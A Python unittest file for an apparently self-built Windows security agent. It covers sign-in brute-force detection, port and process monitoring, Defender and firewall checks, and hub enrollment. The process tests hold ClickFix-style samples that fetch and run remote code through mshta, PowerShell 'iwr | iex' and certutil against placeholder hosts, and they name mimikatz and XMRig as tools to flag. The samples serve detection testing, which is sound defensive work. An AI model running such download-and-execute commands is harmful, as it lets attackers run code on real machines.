#!/usr/bin/env python3
"""The Windows agent (windows_agent/): its sensors read canned Windows output, its hub client is tried against the REAL hub
code (a Flask test client), so the agent and the hub cannot drift apart without a test failing.
Run:  swarmsentinel-env/bin/python3 backend/tools/test_windows_agent.py"""
import os
import sys
import tempfile
import unittest
from collections import namedtuple
from unittest import mock

# SAFETY: throwaway data dirs and keys BEFORE anything imports the hub or the agent.
_TMP = tempfile.mkdtemp()
os.environ['DATA_DIR'] = _TMP
os.environ['DATABASE_URL'] = f'sqlite:///{_TMP}/winagent-test.db'
os.environ['SSAI_API_KEY'] = ADMIN = 'admin-key-for-tests'
os.environ['SSAI_AGENT_HOME'] = os.path.join(_TMP, 'agent-home')
os.environ.pop('SSAI_TRUSTED_PROXIES', None)

HERE = os.path.dirname(os.path.abspath(__file__))
BACKEND = os.path.dirname(HERE)
sys.path[:0] = [os.path.join(BACKEND, 'agents'), BACKEND, os.path.join(os.path.dirname(BACKEND), 'windows_agent')]

from ssai_agent import agent, config, hub, sensors, state as state_module, util  # noqa: E402

NS = 'xmlns="http://schemas.microsoft.com/win/2004/08/events/event"'


def event_xml(record_id, account='bob', address='203.0.113.9', logon_type='3'):
    """One Security-log event, shaped like `wevtutil qe Security /f:xml` prints it."""
    return (f'<Event {NS}><System><EventRecordID>{record_id}</EventRecordID></System><EventData>'
            f'<Data Name="TargetUserName">{account}</Data><Data Name="IpAddress">{address}</Data>'
            f'<Data Name="LogonType">{logon_type}</Data></EventData></Event>')


def new_state():
    return state_module.State(path=os.path.join(tempfile.mkdtemp(), 'state.json'))


def powershell_answering(**by_keyword):
    """A fake PowerShell: the answer depends on which keyword appears in the script it is asked to run."""
    def fake(script, timeout=45):
        for keyword, answer in by_keyword.items():
            if keyword in script:
                return answer
        return ''
    return fake


class Helpers(unittest.TestCase):
    def test_private_addresses_are_masked_and_public_ones_are_not(self):
        text = 'from 192.168.1.50 and 10.1.2.3 and 8.8.8.8 and 172.16.5.5'
        self.assertEqual(util.mask_private_ips(text), 'from 192.168.xxx.xxx and 10.1.xxx.xxx and 8.8.8.8 and 172.16.xxx.xxx')

    def test_private_address_test(self):
        for private in ('192.168.1.1', '10.0.0.5', '127.0.0.1', '::1', 'fe80::1'):
            self.assertTrue(util.is_private_address(private), private)
        for public in ('8.8.8.8', '203.0.113.9', 'not an address', ''):
            self.assertFalse(util.is_private_address(public), public)

    def test_a_missing_tool_gives_empty_text_not_a_crash(self):
        self.assertEqual(util.run_command(['this-program-does-not-exist-ssai']), '')

    def test_powershell_single_object_or_list_both_become_a_list(self):
        self.assertEqual(sensors.powershell_objects('{"a":1}'), [{'a': 1}])
        self.assertEqual(sensors.powershell_objects('[{"a":1},{"a":2}]'), [{'a': 1}, {'a': 2}])
        self.assertEqual(sensors.powershell_objects('garbage'), [])
        self.assertEqual(sensors.powershell_objects(''), [])


class State(unittest.TestCase):
    def test_a_finding_is_sent_once_then_again_after_a_day(self):
        now = [1000.0]
        s = state_module.State(path=os.path.join(tempfile.mkdtemp(), 's.json'), clock=lambda: now[0])
        self.assertTrue(s.should_send('k'))
        s.mark_sent('k')
        self.assertFalse(s.should_send('k'))
        now[0] += state_module.REPEAT_AFTER_SECONDS + 1
        self.assertTrue(s.should_send('k'))

    def test_state_survives_a_restart(self):
        path = os.path.join(tempfile.mkdtemp(), 's.json')
        first = state_module.State(path=path)
        first.put('last_failed_record', 41)
        first.mark_sent('k')
        first.save()
        second = state_module.State(path=path)
        self.assertEqual(second.get('last_failed_record'), 41)
        self.assertFalse(second.should_send('k'))


class Logins(unittest.TestCase):
    def sensor(self, outputs):
        """A LoginSensor whose wevtutil answers come from `outputs`, a list consumed one look at a time."""
        queue = list(outputs)
        return sensors.LoginSensor(new_state(), run=lambda args, timeout=30: queue.pop(0) if queue else '', can_read_log=lambda: True)

    def test_the_first_look_only_notes_where_the_log_ends(self):
        s = self.sensor([''.join(event_xml(i) for i in range(1, 30)), ''])
        self.assertEqual(s.scan(), [])

    def test_a_burst_of_failures_from_one_address_is_reported(self):
        old = ''.join(event_xml(i) for i in range(1, 4))
        burst = ''.join(event_xml(i, account=a) for i, a in zip(range(4, 11), ['admin', 'root', 'sa', 'bob', 'x', 'y', 'z']))
        s = self.sensor([old, '', old + burst, ''])
        s.scan()
        found = s.scan()
        self.assertEqual(len(found), 1)
        self.assertEqual((found[0].threat_type, found[0].severity, found[0].url), ('brute-force', 'medium', '203.0.113.9'))
        self.assertIn('7 failed', found[0].description)

    def test_a_few_typos_are_not_reported(self):
        s = self.sensor([event_xml(1), '', event_xml(1) + event_xml(2) + event_xml(3), ''])
        s.scan()
        self.assertEqual(s.scan(), [])

    def test_twenty_failures_is_high_severity(self):
        burst = ''.join(event_xml(i) for i in range(2, 30))
        s = self.sensor([event_xml(1), '', event_xml(1) + burst, ''])
        s.scan()
        self.assertEqual(s.scan()[0].severity, 'high')

    def test_remote_desktop_from_the_internet_is_reported_but_from_the_lan_is_not(self):
        s = self.sensor(['', event_xml(1, logon_type='10'), '', event_xml(1, logon_type='10')
                         + event_xml(2, address='8.8.4.4', logon_type='10') + event_xml(3, address='192.168.0.7', logon_type='10')])
        s.scan()
        found = s.scan()
        self.assertEqual([f.threat_type for f in found], ['remote-login'])
        self.assertEqual(found[0].url, '8.8.4.4')

    def test_an_unreadable_security_log_is_reported_not_silently_ignored(self):
        s = sensors.LoginSensor(new_state(), run=lambda args, timeout=30: '', can_read_log=lambda: False)
        self.assertEqual(s.scan(), [])
        self.assertIn('cannot read the Windows Security log', s.problem)

    def test_unreadable_log_output_is_harmless(self):
        self.assertEqual(sensors.parse_sign_ins('Access is denied.'), [])


class Ports(unittest.TestCase):
    def listeners(self, *ports):
        import json
        return json.dumps([{'Address': a, 'Port': p, 'Program': name} for a, p, name in ports])

    def sensor(self, *looks):
        queue = list(looks)
        return sensors.PortSensor(new_state(), powershell=lambda script, timeout=45: queue.pop(0))

    def test_ports_open_at_the_first_look_are_normal(self):
        s = self.sensor(self.listeners(('0.0.0.0', 3000, 'node')), self.listeners(('0.0.0.0', 3000, 'node')))
        self.assertEqual(s.scan(), [])
        self.assertEqual(s.scan(), [])

    def test_a_new_port_is_reported_only_when_it_is_still_there_next_time(self):
        base = ('0.0.0.0', 3000, 'node')
        s = self.sensor(self.listeners(base), self.listeners(base, ('0.0.0.0', 4444, 'evil')),
                        self.listeners(base, ('0.0.0.0', 4444, 'evil')), self.listeners(base, ('0.0.0.0', 4444, 'evil')))
        s.scan()
        self.assertEqual(s.scan(), [])                       # seen once: could be a flicker
        found = s.scan()                                     # seen twice: real
        self.assertEqual((found[0].threat_type, found[0].url), ('unexpected-listener', 'localhost:4444'))
        self.assertIn('evil', found[0].description)
        self.assertEqual(s.scan(), [])                       # now known: not reported again

    def test_a_flicker_is_forgotten(self):
        s = self.sensor(self.listeners(), self.listeners(('0.0.0.0', 4444, 'x')), self.listeners(), self.listeners(('0.0.0.0', 4444, 'x')))
        for _ in range(4):
            self.assertEqual(s.scan(), [])

    def test_loopback_dynamic_and_normal_windows_ports_are_ignored(self):
        s = self.sensor(self.listeners(), self.listeners(('127.0.0.1', 4444, 'dev'), ('::1', 4445, 'dev'), ('0.0.0.0', 50000, 'rpc'),
                                                          ('0.0.0.0', 445, 'System')),
                        self.listeners(('127.0.0.1', 4444, 'dev'), ('::1', 4445, 'dev'), ('0.0.0.0', 50000, 'rpc'), ('0.0.0.0', 445, 'System')))
        s.scan()
        s.scan()
        self.assertEqual(s.scan(), [])

    def test_ports_the_owner_allows_are_ignored(self):
        with mock.patch.dict(os.environ, {'SSAI_ALLOWED_PORTS': '8080, 9090'}):
            s = self.sensor(self.listeners(), self.listeners(('0.0.0.0', 8080, 'web')), self.listeners(('0.0.0.0', 8080, 'web')))
            s.scan()
            s.scan()
            self.assertEqual(s.scan(), [])


class Processes(unittest.TestCase):
    def check(self, name, command_line):
        return sensors.rule_for_process(name, command_line)

    def test_miners_and_hacking_tools_are_found_by_name(self):
        self.assertEqual(self.check('XMRig.exe', '')[1], 'high')
        self.assertEqual(self.check('mimikatz.exe', '')[1], 'high')

    def test_clickfix_style_commands_are_found(self):
        self.assertEqual(self.check('mshta.exe', 'mshta.exe https://evil.example/a.hta')[1], 'high')
        self.assertEqual(self.check('powershell.exe', 'powershell -w hidden -c "iwr http://x.example/a | iex"')[1], 'high')
        self.assertEqual(self.check('powershell.exe', 'powershell -enc ' + 'A' * 40)[1], 'medium')
        self.assertEqual(self.check('certutil.exe', 'certutil -urlcache -f http://x.example/a.exe a.exe')[1], 'high')

    def test_ordinary_programs_are_left_alone(self):
        self.assertIsNone(self.check('chrome.exe', 'chrome.exe --type=renderer'))
        self.assertIsNone(self.check('powershell.exe', 'powershell -NoProfile -File C:\\scripts\\backup.ps1'))
        self.assertIsNone(self.check('notepad.exe', None))

    def test_the_finding_never_copies_the_command_line(self):
        import json
        secret = 'powershell -enc ' + 'S3CRETPASSWORD' * 4
        listing = json.dumps([{'ProcessId': 99, 'Name': 'powershell.exe', 'CommandLine': secret}])
        found = sensors.ProcessSensor(new_state(), powershell=lambda s, timeout=45: listing).scan()
        self.assertEqual(len(found), 1)
        self.assertNotIn('S3CRET', found[0].description + found[0].url + found[0].key)


class Security(unittest.TestCase):
    def scan(self, defender, firewall):
        ps = powershell_answering(**{'Get-MpComputerStatus': defender, 'Get-NetFirewallProfile': firewall})
        return sensors.SecuritySensor(new_state(), powershell=ps).scan()

    def test_defender_real_time_off_is_high(self):
        found = self.scan('{"AntivirusEnabled":true,"RealTimeProtectionEnabled":false,"AntivirusSignatureAge":0}', '[]')
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('protection-off', 'high')])

    def test_stale_definitions_are_medium(self):
        found = self.scan('{"AntivirusEnabled":true,"RealTimeProtectionEnabled":true,"AntivirusSignatureAge":30}', '[]')
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('protection-stale', 'medium')])

    def test_another_antivirus_in_charge_means_silence(self):
        self.assertEqual(self.scan('{"AntivirusEnabled":false,"RealTimeProtectionEnabled":false}', '[]'), [])
        self.assertEqual(self.scan('', '[]'), [])

    def test_a_disabled_firewall_profile_is_high(self):
        found = self.scan('', '[{"Name":"Domain","Enabled":true},{"Name":"Public","Enabled":false}]')
        self.assertEqual(len(found), 1)
        self.assertIn('Public', found[0].description)

    def test_everything_healthy_reports_nothing(self):
        self.assertEqual(self.scan('{"AntivirusEnabled":true,"RealTimeProtectionEnabled":true,"AntivirusSignatureAge":1}',
                                   '[{"Name":"Domain","Enabled":true}]'), [])


class Disk(unittest.TestCase):
    Usage = namedtuple('Usage', 'total used free')

    def scan(self, free_percent):
        with mock.patch.object(sensors.shutil, 'disk_usage', return_value=self.Usage(100, 100 - free_percent, free_percent)):
            return sensors.DiskSensor(new_state(), drive='C:\\').scan()

    def test_levels(self):
        self.assertEqual(self.scan(50), [])
        self.assertEqual(self.scan(8)[0].severity, 'medium')
        self.assertEqual(self.scan(3)[0].severity, 'high')


class HubClientAgainstTheRealHub(unittest.TestCase):
    """The agent's hub client talking to the real Flask routes through a test client."""

    @classmethod
    def setUpClass(cls):
        import app as appmod
        if _TMP not in appmod.app.config['SQLALCHEMY_DATABASE_URI']:
            raise RuntimeError('refusing to run against a non-test database')
        cls.appmod, cls.app, cls.db = appmod, appmod.app, appmod.db
        cls.app.config['TESTING'] = True
        appmod._AUDIT_PATH = os.path.join(_TMP, 'audit.jsonl')
        from models import Agent, EnrollmentCode, Node, Threat
        cls.models = (Threat, Agent, Node, EnrollmentCode)

    def setUp(self):
        self.ctx = self.app.app_context()
        self.ctx.push()
        self.db.create_all()
        for model in self.models:
            model.query.delete()
        self.db.session.commit()
        import auth
        auth.enroll_failures = auth.SlidingWindow(5, 300)
        auth.node_ingest = auth.SlidingWindow(600, 60)
        self.http = self.app.test_client()
        self.online = True

    def tearDown(self):
        self.db.session.remove()
        self.ctx.pop()

    def transport(self, method, url, payload, token):
        """Stand in for the network: send the request to the Flask test client instead."""
        if not self.online:
            return 0, {}
        path = '/' + url.split('/', 3)[3]
        headers = {'X-API-Key': token} if token else {}
        reply = self.http.open(path, method=method, json=payload, headers=headers)
        return reply.status_code, reply.get_json(silent=True) or {}

    def enrolled_client(self, name='WINPC'):
        code = self.http.post('/api/nodes/enrollment-codes', json={}, headers={'X-API-Key': ADMIN}).get_json()['code']
        saved, problem = hub.enroll('http://hub.test:5000', code, name, name, transport=self.transport)
        self.assertEqual(problem, '')
        return hub.HubClient(config.Settings(**saved), transport=self.transport), saved

    def test_enrolling_gives_a_working_credential_and_a_used_code_is_refused(self):
        client, saved = self.enrolled_client()
        self.assertEqual((saved['node_id'], saved['api']), ('WINPC', 'http://hub.test:5000/api'))
        self.assertTrue(saved['token'].startswith('ssn_'))
        node = self.models[2].query.filter_by(node_id='WINPC').one()
        self.assertEqual(node.platform, 'windows')
        again, problem = hub.enroll('http://hub.test:5000', 'AAAA-BBBB-CCCC-DDDD', 'X', 'X', transport=self.transport)
        self.assertIsNone(again)
        self.assertIn('invalid', problem)

    def test_an_unreachable_hub_is_explained(self):
        self.online = False
        saved, problem = hub.enroll('http://hub.test:5000', 'AAAA-BBBB-CCCC-DDDD', 'X', 'X', transport=self.transport)
        self.assertIsNone(saved)
        self.assertIn('cannot reach', problem)

    def test_agents_appear_with_the_machine_name_and_windows_platform(self):
        client, _ = self.enrolled_client()
        client.register('WinLoginAgent', 'auth_monitor', 'watches sign-ins')
        row = self.models[1].query.filter_by(name='WinLoginAgent@WINPC').one()
        self.assertEqual(row.platform, 'windows')
        self.assertEqual(client.heartbeat('WinLoginAgent', 3, 1, '2026-10-31T00:00:00+00:00'), 200)

    def test_a_finding_arrives_masked_with_the_real_address_kept_for_the_admin(self):
        client, _ = self.enrolled_client()
        client.send_finding(sensors.Finding('192.168.0.77', 'brute-force', 'medium',
                                            '8 failed sign-ins from 192.168.0.77', 'k'), 'WinLoginAgent')
        threat = self.models[0].query.one()
        self.assertEqual(threat.url, '192.168.xxx.xxx')
        self.assertNotIn('192.168.0.77', threat.description)
        self.assertEqual(threat.node_id, 'WINPC')
        self.assertTrue(threat.detected_by.endswith('@WINPC'))

    def test_findings_wait_while_the_hub_is_down_and_arrive_afterwards(self):
        client, _ = self.enrolled_client()
        finding = sensors.Finding('203.0.113.5', 'brute-force', 'high', 'x', 'k')
        self.online = False
        client.send_finding(finding, 'WinLoginAgent')
        self.assertEqual(len(client.waiting), 1)
        self.assertEqual(self.models[0].query.count(), 0)
        self.online = True
        client.resend_waiting()
        self.assertEqual((len(client.waiting), self.models[0].query.count()), (0, 1))

    def test_a_revoked_machine_is_told_so(self):
        client, saved = self.enrolled_client()
        self.http.post('/api/nodes/WINPC/revoke', headers={'X-API-Key': ADMIN})
        client.send_finding(sensors.Finding('203.0.113.5', 'x', 'low', 'x', 'k'), 'WinLoginAgent')
        self.assertTrue(client.credential_rejected)
        self.assertEqual(len(client.waiting), 0)             # a refusal is final: not retried forever

    def test_a_whole_runner_pass_reaches_the_dashboard(self):
        client, _ = self.enrolled_client()
        state = new_state()
        burst = ''.join(event_xml(i) for i in range(2, 12))
        looks = [event_xml(1), '', event_xml(1) + burst, '']
        login = sensors.LoginSensor(state, run=lambda args, timeout=30: looks.pop(0) if looks else '', can_read_log=lambda: True)
        runner = agent.AgentRunner(client, state, [login])
        runner.register_all()
        runner.run_sensor(login)
        runner.run_sensor(login)
        self.assertEqual(self.models[0].query.count(), 1)
        self.assertEqual(runner.found['WinLoginAgent'], 1)
        runner.run_sensor(login)                               # same burst again: not sent twice
        self.assertEqual(self.models[0].query.count(), 1)


class Runner(unittest.TestCase):
    class FakeClient:
        credential_rejected = False

        def __init__(self):
            self.calls = []

        def register(self, *a):
            self.calls.append(('register', a[0]))

        def heartbeat(self, name, *a):
            self.calls.append(('heartbeat', name))
            return 200

        def send_finding(self, finding, by):
            self.calls.append(('finding', finding.key))

    class Boom(sensors.Sensor):
        agent_name = 'Boom'

        def scan(self):
            raise RuntimeError('windows said no')

    class Once(sensors.Sensor):
        agent_name = 'Once'

        def scan(self):
            return [sensors.Finding('u', 'disk-low', 'low', 'd', 'same-key')]

    def test_one_broken_sensor_does_not_stop_the_others(self):
        client, state = self.FakeClient(), new_state()
        runner = agent.AgentRunner(client, state, [self.Boom(state), self.Once(state)])
        runner.run_due()
        self.assertIn(('finding', 'same-key'), client.calls)
        self.assertIn(('heartbeat', 'Boom'), client.calls)

    def test_sensors_run_when_due_not_every_tick(self):
        now = [0.0]
        client, state = self.FakeClient(), new_state()
        sensor = self.Once(state)
        sensor.interval = 100
        runner = agent.AgentRunner(client, state, [sensor], clock=lambda: now[0])
        runner.run_due()
        now[0] = 50
        runner.run_due()
        self.assertEqual(runner.scans['Once'], 1)
        now[0] = 101
        runner.run_due()
        self.assertEqual(runner.scans['Once'], 2)

    def test_dry_run_sends_nothing(self):
        state = new_state()
        runner = agent.AgentRunner(None, state, [self.Once(state)])
        self.assertEqual(len(runner.run_sensor(runner.sensors[0], send=False)), 1)


class Settings(unittest.TestCase):
    def test_settings_round_trip_and_an_unenrolled_pc_has_none(self):
        with mock.patch.dict(os.environ, {'SSAI_AGENT_HOME': tempfile.mkdtemp()}):
            self.assertIsNone(config.load_settings())
            config.save_settings(config.Settings('http://h:5000/api', 'PC', 'ssn_abc'))
            loaded = config.load_settings()
        self.assertEqual((loaded.api, loaded.node_id, loaded.token), ('http://h:5000/api', 'PC', 'ssn_abc'))


if __name__ == '__main__':
    unittest.main()
